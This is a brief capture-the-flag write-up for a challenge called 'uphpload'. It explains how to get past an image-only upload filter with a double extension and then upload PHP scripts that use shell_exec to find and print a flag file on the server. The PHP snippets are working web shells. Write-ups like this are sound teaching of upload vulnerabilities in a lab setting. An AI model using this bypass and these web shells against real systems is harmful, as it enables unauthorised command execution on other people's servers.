# uphpload

## Description
![Chall desc](../../images/1.png)
  
## Solution
The webpage allows us to upload images and view them. This immediately suggests a file upload vulnerability.

![index](../../images/2.png)

The page only accepts image files. This can be bypassed using a double extension.

![index](../../images/3.png)

Upload a PHP script to search for `flag.txt` file:

```php
<?php
    print shell_exec('find / -name "flag.txt"');
?>
```

Click on the file in uploads to run the script. This gives us the flag location.

![index](../../images/4.png)

Now upload a script to print the flag:

```php
<?php
    print shell_exec('cat /flag_is_here/flag.txt');
?>
```

![index](../../images/5.png)